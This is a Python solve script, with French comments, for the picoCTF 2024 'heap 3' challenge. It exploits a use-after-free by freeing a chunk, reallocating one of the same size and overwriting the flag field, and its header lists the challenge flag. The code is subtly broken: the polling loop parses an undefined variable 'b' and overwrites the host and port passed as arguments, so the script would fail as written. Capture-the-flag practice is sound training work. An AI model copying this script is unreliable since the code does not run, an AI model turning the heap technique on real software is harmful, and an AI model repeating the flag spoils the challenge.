# 440 - heap 3  (Binary Exploitation, picoCTF 2024)
# Flag: academy{now_thats_free_real_estate_95cc82ff}
# Write-up: ../../../writeups/binary-exploitation/440-heap-3.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(6)
time.sleep(0.4)


def rd(t=1.0, stop=b"choice"):
    s.settimeout(t)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
            if stop in buf:
                break
        except socket.timeout:
            break
    return buf.decode("utf-8", "replace")


print(rd(1.2)[:200])
# 1) free(x)
s.sendall(b"5\n")
time.sleep(0.3)
rd(0.8)
# 2) alloc de la meme taille -> meme chunk
s.sendall(b"2\n")
time.sleep(0.3)
print(rd(0.8)[:200])
s.sendall(b"35\n")
time.sleep(0.3)
print(rd(0.8)[:200])
s.sendall(b"A" * 30 + b"pico\n")
time.sleep(0.4)
rd(0.8)
# 3) verifier x->flag
s.sendall(b"3\n")
time.sleep(0.3)
print("--- x ---")
print(rd(0.8)[:300])
# 4) check win
s.sendall(b"4\n")
time.sleep(0.8)
out = b""
t0 = time.time()
while time.time() - t0 < 5:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("utf-8", "replace")
print("--- reponse ---")
print(txt[:600])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
